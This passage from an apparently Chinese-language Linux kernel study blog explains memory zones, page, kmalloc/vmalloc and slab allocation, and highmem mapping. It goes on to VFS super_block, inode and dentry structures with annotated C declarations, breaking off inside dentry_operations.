<li>内核将内存按地址的顺序分成了不同的区，有的硬件只能访问有专门的区，其实一般主要关注的区只有3个：</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th><strong>区</strong></th>
<th><strong>描述</strong></th>
<th><strong>物理内存</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>ZONE_DMA</td>
<td>DMA使用的页</td>
<td>&lt; 16MB</td>
</tr>
<tr>
<td>ZONE_NORMAL</td>
<td>正常可寻址的页</td>
<td>16MB～896MB</td>
</tr>
<tr>
<td>ZONE_HIGHMEM</td>
<td>动态映射的页</td>
<td>&gt; 896MB 某些硬件只能直接访问内存地址，不支持内存映射，对于这些硬件内核会分配 ZONE_DMA 区的内存。</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>某些硬件的内存寻址范围很广，比虚拟寻址范围还要大的多，那么就会用到 ZONE_HIGHMEM 区的内存</li>
<li>对于 ZONE_HIGHMEM 区的内存，后面还会讨论</li>
<li>对于大部分的内存申请，只要用 ZONE_NORMAL 区的内存即可，例如以下几种方式就是分配 ZONE_NORMAL 区的内存：</li>
</ul>
<p><strong>按页获取内存</strong>：最原始的方法，用于底层获取内存的方式</p>
<div class="table-container">
<table>
<thead>
<tr>
<th><strong>方法</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>alloc_page(gfp_mask)</td>
<td>只分配一页，返回指向页结构的指针</td>
</tr>
<tr>
<td>alloc_pages(gfp_mask, order)</td>
<td>分配 2^order 个页，返回指向第一页页结构的指针</td>
</tr>
<tr>
<td>__get_free_page(gfp_mask)</td>
<td>只分配一页，返回指向其逻辑地址的指针</td>
</tr>
<tr>
<td>__get_free_pages(gfp_mask, order)</td>
<td>分配 2^order 个页，返回指向第一页逻辑地址的指针</td>
</tr>
<tr>
<td>get_zeroed_page(gfp_mask)</td>
<td>只分配一页，让其内容填充为0，返回指向其逻辑地址的指针</td>
</tr>
</tbody>
</table>
</div>
<p><strong>按字节获取内存</strong>：使用最多的获取方法</p>
<p>有两种方式进行该种类型的分配：</p>
<ul>
<li>kmalloc：分配的内存物理地址是连续的，虚拟地址也是连续的</li>
<li>vmalloc：分配的内存物理地址是不连续的，虚拟地址是连续的</li>
</ul>
<p>因此在使用中，用的较多的还是 kmalloc：</p>
<ul>
<li>kmalloc 的性能较好</li>
<li>kmalloc 的物理地址和虚拟地址之间的映射比较简单，只需要将物理地址的第一页和虚拟地址第一页关联起来即可</li>
<li>vmalloc 由于物理地址是不连续的，所以要将物理地址的每一页都和虚拟地址关联起来才行</li>
</ul>
<p>PS：其实 kmalloc() 底层也是基于 SLAB 分配器的，只不过它所需要的管理结构头已经按照 2^n 的大小排列事先准备好了而已，这个管理结构体数组是 <code>struct cache_sizes malloc_sizes[]</code></p>
<p><strong>Slab 层获取</strong>：效率最高的获取方法</p>
<p>linux 中的高速缓存是用所谓 slab 层来实现的，slab 层即内核中管理高速缓存的机制，整个 slab 层的原理如下：</p>
<ul>
<li>可以在内存中建立各种对象的高速缓存（比如进程描述相关的结构 task_struct 的高速缓存）</li>
<li>除了针对特定对象的高速缓存以外，也有通用对象的高速缓存</li>
<li>每个高速缓存中包含多个 slab，slab 用于管理缓存的对象</li>
<li>slab 中包含多个缓存的对象，物理上由一页或多个连续的页组成</li>
</ul>
<p>高速缓存 -&gt; slab -&gt; 缓存对象之间的关系如下图：</p>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1661432738679-1661853278314.png" class width="1661432738679"> 
<p>用于管理 slab 的结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span>   <span class="comment">/* 存放缓存对象，这个链表有 满，部分满，空 3种状态  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> colouroff; <span class="comment">/* slab 着色的偏移量 */</span></span><br><span class="line">    <span class="keyword">void</span> *s_mem;             <span class="comment">/* 在 slab 中的第一个对象 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> inuse;         <span class="comment">/* slab 中已分配的对象数 */</span></span><br><span class="line">    <span class="keyword">kmem_bufctl_t</span> <span class="built_in">free</span>;      <span class="comment">/* 第一个空闲对象(如果有的话) */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> nodeid;   <span class="comment">/* 应该是在 NUMA 环境下使用 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>slab 层的应用主要有四个方法：</p>
<ul>
<li>高速缓存的创建</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct kmem_cache *</span></span><br><span class="line"><span class="function"><span class="title">kmem_cache_create</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">size_t</span> size, <span class="keyword">size_t</span> align,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags, <span class="keyword">void</span> (*ctor)(<span class="keyword">void</span> *))</span></span></span><br><span class="line"><span class="function"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="function"> * 创建成功时,返回指向高速缓存指针(kmem_cache *cachep)</span></span></span><br><span class="line"><span class="comment"><span class="function"> */</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>从高速缓存中分配对象</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">kmem_cache_alloc</span><span class="params">(struct kmem_cache *cachep, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="function"> * @cachep - 指向高速缓存指针</span></span></span><br><span class="line"><span class="comment"><span class="function"> * @flags  - 之前讨论的 gfp_mask 标志,只有在高速缓存中所有slab都没有空闲对象</span></span></span><br><span class="line"><span class="comment"><span class="function"> *           并且需要申请新的空间时,这个标志才会起作用</span></span></span><br><span class="line"><span class="comment"><span class="function"> *</span></span></span><br><span class="line"><span class="comment"><span class="function"> * 分配成功时,返回指向对象的指针</span></span></span><br><span class="line"><span class="comment"><span class="function"> */</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>向高速缓存释放对象</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kmem_cache_free</span><span class="params">(struct kmem_cache *cachep, <span class="keyword">void</span> *objp)</span></span></span><br><span class="line"><span class="function"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="function"> * @cachep - 指向高速缓存指针</span></span></span><br><span class="line"><span class="comment"><span class="function"> * @objp   - 要释放的对象的指针</span></span></span><br><span class="line"><span class="comment"><span class="function"> */</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>高速缓存的销毁</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kmem_cache_destroy</span><span class="params">(struct kmem_cache *cachep)</span></span></span><br><span class="line"><span class="function"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="function"> * @cachep - 指向高速缓存指针 </span></span></span><br><span class="line"><span class="comment"><span class="function"> */</span></span></span><br></pre></td></tr></table></figure>
<p><strong>高端内存获取</strong></p>
<p>高端内存就是之前提到的 ZONE_HIGHMEM 区的内存</p>
<p>在x86体系结构中，这个区的内存不能映射到内核地址空间上，也就是 <strong>没有逻辑地址</strong>，为了使用 ZONE_HIGHMEM 区的内存，内核提供了永久映射和临时映射2种手段：</p>
<ul>
<li>永久映射：永久映射的函数是可以睡眠的，所以只能用在进程上下文中 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 将 ZONE_HIGHMEM 区的一个page永久的映射到内核地址空间</span></span><br><span class="line"><span class="comment"> * 返回值即为这个page对应的逻辑地址 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">kmap</span><span class="params">(struct page *page)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/* 允许永久映射的数量是有限的，所以不需要高端内存时，应该及时的解除映射 */</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">kunmap</span><span class="params">(struct page *page)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>临时映射：临时映射不会阻塞，也禁止了内核抢占，所以可以用在中断上下文和其他不能重新调度的地方</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 将 ZONE_HIGHMEM 区的一个page临时映射到内核地址空间</span></span><br><span class="line"><span class="comment"> * 其中的 km_type 表示映射的目的</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">kmap_atomic</span><span class="params">(struct page *page, <span class="keyword">enum</span> km_type idx)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/* 相应的解除映射是个宏 */</span></span></span><br><span class="line"><span class="function"><span class="meta">#<span class="meta-keyword">define</span> kunmap_atomic(addr, idx)    do &#123; pagefault_enable(); &#125; while (0)</span></span></span><br></pre></td></tr></table></figure>
<h2 id="虚拟文件系统"><a href="#虚拟文件系统" class="headerlink" title="虚拟文件系统"></a>虚拟文件系统</h2><p>虚拟文件系统（VFS）是 linux 内核和具体 I/O 设备之间的封装的一层共通访问接口，通过这层接口，linux 内核可以以同一的方式访问各种 I/O 设备，主要有以下好处：</p>
<ul>
<li>简化了应用程序的开发：应用通过统一的系统调用访问各种存储介质</li>
<li>简化了新文件系统加入内核的过程：新文件系统只要实现VFS的各个接口即可，不需要修改内核部分</li>
</ul>
<p>虚拟文件系统本身是 linux 内核的一部分，是纯软件的东西，并不需要任何硬件的支持，其核心就是4个主要对象，具体每个对象的含义参见如下的详细介绍</p>
<p><strong>超级块</strong></p>
<p>超级块（super_block）主要存储文件系统相关的信息，这是个针对文件系统级别的概念</p>
<p>它一般存储在磁盘的特定扇区中，但是对于那些基于内存的文件系统（比如 proc，sysfs），超级块是在使用时创建在内存中的</p>
<p>描述超级块的结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * 超级块结构中定义的字段非常多</span></span><br><span class="line"><span class="comment"> * 这里只介绍一些重要的属性</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">s_list</span>;</span>               <span class="comment">/* 指向所有超级块的链表 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">super_operations</span>    *<span class="title">s_op</span>;</span> <span class="comment">/* 超级块方法 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dentry</span>        *<span class="title">s_root</span>;</span>           <span class="comment">/* 目录挂载点 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>        <span class="title">s_lock</span>;</span>            <span class="comment">/* 超级块信号量 */</span></span><br><span class="line">    <span class="keyword">int</span>            s_count;                   <span class="comment">/* 超级块引用计数 */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">s_inodes</span>;</span>           <span class="comment">/* inode链表 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mtd_info</span>        *<span class="title">s_mtd</span>;</span>            <span class="comment">/* 存储磁盘信息 */</span></span><br><span class="line">    <span class="keyword">fmode_t</span>            s_mode;                <span class="comment">/* 安装权限 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 其中的 s_op 中定义了超级块的操作方法</span></span><br><span class="line"><span class="comment"> * 这里只介绍一些相对重要的函数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">super_operations</span> &#123;</span></span><br><span class="line">       <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *(*<span class="title">alloc_inode</span>)(<span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">sb</span>);</span> <span class="comment">/* 创建和初始化一个索引节点对象 */</span></span><br><span class="line">    <span class="keyword">void</span> (*destroy_inode)(struct inode *);                <span class="comment">/* 释放给定的索引节点 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> (*dirty_inode) (struct inode *);                 <span class="comment">/* VFS在索引节点被修改时会调用这个函数 */</span></span><br><span class="line">    <span class="keyword">int</span> (*write_inode) (struct inode *, <span class="keyword">int</span>);             <span class="comment">/* 将索引节点写入磁盘,wait表示写操作是否需要同步 */</span></span><br><span class="line">    <span class="keyword">void</span> (*drop_inode) (struct inode *);                  <span class="comment">/* 最后一个指向索引节点的引用被删除后,VFS会调用这个函数 */</span></span><br><span class="line">    <span class="keyword">void</span> (*delete_inode) (struct inode *);                <span class="comment">/* 从磁盘上删除指定的索引节点 */</span></span><br><span class="line">    <span class="keyword">void</span> (*put_super) (struct super_block *);             <span class="comment">/* 卸载文件系统时由VFS调用,用来释放超级块 */</span></span><br><span class="line">    <span class="keyword">void</span> (*write_super) (struct super_block *);           <span class="comment">/* 用给定的超级块更新磁盘上的超级块 */</span></span><br><span class="line">    <span class="keyword">int</span> (*sync_fs)(struct super_block *sb, <span class="keyword">int</span> wait);     <span class="comment">/* 使文件系统中的数据与磁盘上的数据同步 */</span></span><br><span class="line">    <span class="keyword">int</span> (*statfs) (struct dentry *, struct kstatfs *);    <span class="comment">/* VFS调用该函数获取文件系统状态 */</span></span><br><span class="line">    <span class="keyword">int</span> (*remount_fs) (struct super_block *, <span class="keyword">int</span> *, <span class="keyword">char</span> *); <span class="comment">/* 指定新的安装选项重新安装文件系统时,VFS会调用该函数 */</span></span><br><span class="line">    <span class="keyword">void</span> (*clear_inode) (struct inode *);                 <span class="comment">/* VFS调用该函数释放索引节点,并清空包含相关数据的所有页面 */</span></span><br><span class="line">    <span class="keyword">void</span> (*umount_begin) (struct super_block *);          <span class="comment">/* VFS调用该函数中断安装操作 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>索引节点</strong></p>
<p>索引节点是 VFS 中的核心概念，它包含内核在操作文件或目录时需要的全部信息</p>
<ul>
<li>一个索引节点代表文件系统中的一个文件（Linux 一切皆文件）</li>
<li>Linux 系统为每一个文件都分配了一个 inode 编号，这个编号中记录了文件相关的一些元信息，通过这些元信息可以用来唯一标识一个文件（操作系统上的 inode 并非无穷无尽，通常在你安装操作系统后，系统上的 inode 数量就已经确定了下来）</li>
<li>索引节点和超级块一样是实际存储在磁盘上的，当被应用程序访问到时才会在内存中创建</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * 索引节点结构中定义的字段非常多</span></span><br><span class="line"><span class="comment"> * 这里只介绍一些重要的属性</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span>    <span class="title">i_hash</span>;</span>     <span class="comment">/* 散列表，用于快速查找inode */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">i_list</span>;</span>        <span class="comment">/* 索引节点链表 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">i_sb_list</span>;</span>  <span class="comment">/* 超级块链表超级块  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">i_dentry</span>;</span>   <span class="comment">/* 目录项链表 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>        i_ino;      <span class="comment">/* 节点号 */</span></span><br><span class="line">    <span class="keyword">atomic_t</span>        i_count;        <span class="comment">/* 引用计数 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        i_nlink;    <span class="comment">/* 硬链接数 */</span></span><br><span class="line">    <span class="keyword">uid_t</span>            i_uid;          <span class="comment">/* 使用者id */</span></span><br><span class="line">    <span class="keyword">gid_t</span>            i_gid;          <span class="comment">/* 使用组id */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>        <span class="title">i_atime</span>;</span>    <span class="comment">/* 最后访问时间 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>        <span class="title">i_mtime</span>;</span>    <span class="comment">/* 最后修改时间 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>        <span class="title">i_ctime</span>;</span>    <span class="comment">/* 最后改变时间 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_operations</span>    *<span class="title">i_op</span>;</span>  <span class="comment">/* 索引节点操作函数 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>    *<span class="title">i_fop</span>;</span>    <span class="comment">/* 缺省的索引节点操作 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">super_block</span>    *<span class="title">i_sb</span>;</span>              <span class="comment">/* 相关的超级块 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>    *<span class="title">i_mapping</span>;</span>     <span class="comment">/* 相关的地址映射 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>    <span class="title">i_data</span>;</span>         <span class="comment">/* 设备地址映射 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        i_flags;            <span class="comment">/* 文件系统标志 */</span></span><br><span class="line">    <span class="keyword">void</span>            *i_private;             <span class="comment">/* fs 私有指针 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 其中的 i_op 中定义了索引节点的操作方法</span></span><br><span class="line"><span class="comment"> * 这里只介绍一些相对重要的函数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode_operations</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 为dentry对象创造一个新的索引节点 */</span></span><br><span class="line">    <span class="keyword">int</span> (*create) (struct inode *,struct dentry *,<span class="keyword">int</span>, struct nameidata *);</span><br><span class="line">    <span class="comment">/* 在特定文件夹中寻找索引节点,该索引节点要对应于dentry中给出的文件名 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> * (*<span class="title">lookup</span>) (<span class="keyword">struct</span> <span class="title">inode</span> *,<span class="keyword">struct</span> <span class="title">dentry</span> *, <span class="keyword">struct</span> <span class="title">nameidata</span> *);</span></span><br><span class="line">    <span class="comment">/* 创建硬链接 */</span></span><br><span class="line">    <span class="keyword">int</span> (*link) (struct dentry *,struct inode *,struct dentry *);</span><br><span class="line">    <span class="comment">/* 从一个符号链接查找它指向的索引节点 */</span></span><br><span class="line">    <span class="keyword">void</span> * (*follow_link) (struct dentry *, struct nameidata *);</span><br><span class="line">    <span class="comment">/* 在 follow_link 调用之后,该函数由VFS调用进行清除工作 */</span></span><br><span class="line">    <span class="keyword">void</span> (*put_link) (struct dentry *, struct nameidata *, <span class="keyword">void</span> *);</span><br><span class="line">    <span class="comment">/* 该函数由VFS调用,用于修改文件的大小 */</span></span><br><span class="line">    <span class="keyword">void</span> (*truncate) (struct inode *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>接下来看看几种类型的索引结点：</p>
<ul>
<li>磁盘索引结点：保存在硬盘中的索引结点</li>
<li>内存索引结点：保存在内存中的索引结点</li>
<li>文件结点：用于指向磁盘索引结点的结点（有助于硬链接的实现）</li>
</ul>
<p>不管是文件还是目录，[磁盘索引结点] 都需要与 [内存索引结点] 进行“绑定”，这样才可以操控磁盘上的数据，文件被打开时，[磁盘索引结点] 被复制到 [内存索引结点]，以便于使用</p>
<p><strong>目录项</strong></p>
<p>目录项不是目录，而是目录的组成部分</p>
<p>目录项是描述文件的逻辑属性，只存在于内存中，并不是实际存在于磁盘上，更确切的说是存在于内存的目录项缓存，为了提高查找性能而设计：</p>
<ul>
<li>在使用的时候在内存中创建目录项对象，其实通过索引节点已经可以定位到指定的文件</li>
<li>但是索引节点对象的属性非常多，在查找，比较文件时，直接用索引节点效率不高，所以引入了目录项的概念</li>
</ul>
<p>路径中的每个部分都是一个目录项</p>
<ul>
<li>比如路径：<code>/mnt/cdrom/foo/bar</code> </li>
<li>其中包含5个目录项：<code>/ mnt cdrom foo bar</code></li>
</ul>
<p>每个目录项对象都有3种状态：</p>
<ul>
<li>被使用：对应一个有效的索引节点，并且该对象由一个或多个使用者</li>
<li>未使用：对应一个有效的索引节点，但是VFS当前并没有使用这个目录项</li>
<li>负状态：没有对应的有效索引节点（可能索引节点被删除或者路径不存在了）</li>
</ul>
<p>描述目录项的结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 目录项对象结构 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span> d_count;       <span class="comment">/* 使用计数 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> d_flags;   <span class="comment">/* 目录项标识 */</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> d_lock;        <span class="comment">/* 单目录项锁 */</span></span><br><span class="line">    <span class="keyword">int</span> d_mounted;          <span class="comment">/* 是否登录点的目录项 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">d_inode</span>;</span>    <span class="comment">/* 相关联的索引节点 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> <span class="title">d_hash</span>;</span>    <span class="comment">/* 散列表 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">d_parent</span>;</span>    <span class="comment">/* 父目录的目录项对象 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">qstr</span> <span class="title">d_name</span>;</span>         <span class="comment">/* 目录项名称 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_lru</span>;</span>        <span class="comment">/* 未使用的链表 */</span></span><br><span class="line">    <span class="comment">/* d_child and d_rcu can share memory */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_child</span>;</span>    <span class="comment">/* child of parent list */</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">d_rcu</span>;</span></span><br><span class="line">    &#125; d_u;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_subdirs</span>;</span>    <span class="comment">/* 子目录链表 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_alias</span>;</span>    <span class="comment">/* 索引节点别名链表 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> d_time;        <span class="comment">/* 重置时间 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">dentry_operations</span> *<span class="title">d_op</span>;</span> <span class="comment">/* 目录项操作相关函数 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">d_sb</span>;</span>    <span class="comment">/* 文件的超级块 */</span></span><br><span class="line">    <span class="keyword">void</span> *d_fsdata;            <span class="comment">/* 文件系统特有数据 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> d_iname[DNAME_INLINE_LEN_MIN];    <span class="comment">/* 短文件名 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 目录项相关操作函数 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry_operations</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 该函数判断目录项对象是否有效,VFS准备从dcache中使用一个目录项时会调用这个函数 */</span></span><br><span class="line">    <span class="keyword">int</span> (*d_revalidate)(struct dentry *, struct nameidata *);</span><br><span class="line">    <span class="comment">/* 为目录项对象生成hash值 */</span></span><br><span class="line">    <span class="keyword">int</span> (*d_hash) (struct dentry *, struct qstr *);</span><br><span class="line">    <span class="comment">/* 比较 qstr 类型的2个文件名 */</span></span><br><span class="line">    <span class="keyword">int</span> (*d_compare) (struct dentry *, struct qstr *, struct qstr *);</span><br><span class="line">    <span class="comment">/* 当目录项对象的 d_count 为0时,VFS调用这个函数 */</span></span><br><span class="line">    <span class="keyword">int</span> (*d_delete)(struct dentry *);</span><br><span class="line">    <span class="comment">/* 当目录项对象将要被释放时,VFS调用该函数 */</span></span><br><span class="line">    <span class="keyword">void</span> (*d_release)(struct dentry *);</span><br><span class="line">    <span class="comment">/* 